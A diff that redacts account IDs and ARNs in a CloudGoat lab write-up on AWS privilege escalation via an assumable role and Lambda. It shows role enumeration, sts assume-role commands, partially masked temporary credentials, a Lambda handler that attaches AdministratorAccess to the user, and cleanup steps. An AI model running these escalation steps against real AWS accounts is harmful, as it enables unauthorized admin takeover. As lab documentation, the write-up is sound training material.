@@ -23,9 +23,9 @@ aws sts get-caller-identity --profile cloudgoat_lambda_privesc
 ```
 ```json
 {
-    "UserId": "AIDAVVYTW6AMMAY6ROA3P",
-    "Account": "390346502168",
-    "Arn": "arn:aws:iam::390346502168:user/chris-cgid0gkqfiyl7u"
+    "UserId": "AID..Y6ROA3P",
+    "Account": "39034.....",
+    "Arn": "arn:aws..gyl7u"
 }
 ```
 
@@ -63,7 +63,7 @@ Using `iam:List*`, all IAM roles in the account were enumerated via `aws iam lis
 | Role | Trust Principal | Notes |
 |---|---|---|
 | `cg-debug-role-cgid0gkqfiyl7u` | `lambda.amazonaws.com` | Cannot be assumed directly by an IAM user — only by the Lambda service |
-| `cg-lambdaManager-role-cgid0gkqfiyl7u` | `arn:aws:iam::390346502168:user/chris-cgid0gkqfiyl7u` | Directly assumable by `chris` |
+| `cg-lambdaManager-role-cgid0gkqfiyl7u` | `arn:a..fiyl7u` | Directly assumable by `chris` |
 
 `cg-lambdaManager-role` was the immediate pivot point, as its trust policy explicitly allowed the `chris` user to assume it.
 
@@ -106,7 +106,7 @@ The `chris` IAM user's only attached policy granted `sts:AssumeRole` on `Resourc
 1. Confirm the attached policy and its permissions:
    ```bash
    aws iam list-attached-user-policies --user-name chris-cgid0gkqfiyl7u --profile cloudgoat_lambda_privesc
-   aws iam get-policy-version --policy-arn arn:aws:iam::390346502168:policy/cg-chris-policy-cgid0gkqfiyl7u --version-id v1 --profile cloudgoat_lambda_privesc
+   aws iam get-policy-version --policy-arn arn:aw...yl7u --version-id v1 --profile cloudgoat_lambda_privesc
    ```
 2. Enumerate all roles in the account:
    ```bash
@@ -116,7 +116,7 @@ The `chris` IAM user's only attached policy granted `sts:AssumeRole` on `Resourc
 4. Assume the role:
    ```bash
    aws sts assume-role \
-     --role-arn arn:aws:iam::390346502168:role/cg-lambdaManager-role-cgid0gkqfiyl7u \
+     --role-arn arn:aws:iam:...iyl7u \
      --role-session-name MySession \
      --profile cloudgoat_lambda_privesc
    ```
@@ -126,14 +126,14 @@ The `assume-role` call succeeded without restriction and returned valid temporar
 ```json
 {
     "Credentials": {
-        "AccessKeyId": "ASIAVVYTW6AMGG6NTNEJ",
+        "AccessKeyId": "ASIA...TNEJ",
         "SecretAccessKey": "gaB2a6ji...5F7G6S42aOcX8qkYpMz",
         "SessionToken": "<session-token>",
         "Expiration": "2026-06-07T13:46:02+00:00"
     },
     "AssumedRoleUser": {
-        "AssumedRoleId": "AROAVVYTW6AMDIQH5XCTE:MySession",
-        "Arn": "arn:aws:sts::390346502168:assumed-role/cg-lambdaManager-role-cgid0gkqfiyl7u/MySession"
+        "AssumedRoleId": "AROAVV..XCTE:MySession",
+        "Arn": "arn:a..id0gkqfiyl7u/MySession"
     }
 }
 ```
@@ -243,8 +243,8 @@ OWASP Top 10 2021 – A01: Broken Access Control
    import boto3
 
    def lambda_handler(event, context):
-       username = 'chris-cgid0gkqfiyl7u'
-       admin_policy_arn = 'arn:aws:iam::aws:policy/AdministratorAccess'
+       username = 'chris-cgid.yl7u'
+       admin_policy_arn = 'arn:a..nistratorAccess'
        iam = boto3.client('iam')
        try:
            response = iam.attach_user_policy(
@@ -288,11 +288,11 @@ $ aws iam list-attached-user-policies --user-name chris-cgid0gkqfiyl7u --profile
     "AttachedPolicies": [
         {
             "PolicyName": "cg-chris-policy-cgid0gkqfiyl7u",
-            "PolicyArn": "arn:aws:iam::390346502168:policy/cg-chris-policy-cgid0gkqfiyl7u"
+            "PolicyArn": "arn:aws:..-policy-cgid0gkqfiyl7u"
         },
         {
             "PolicyName": "AdministratorAccess",
-            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
+            "PolicyArn": "arn:a..AdministratorAccess"
         }
     ]
 }
@@ -355,7 +355,7 @@ To avoid ongoing AWS charges and to leave the environment in a clean state after
      ```bash
      aws iam detach-user-policy \
        --user-name chris-cgid0gkqfiyl7u \
-       --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
+       --policy-arn arn..atorAccess \
        --profile cloudgoat_lambda_privesc
      ```
 3. **Destroy the CloudGoat scenario** to tear down all provisioned infrastructure and avoid continued billing:
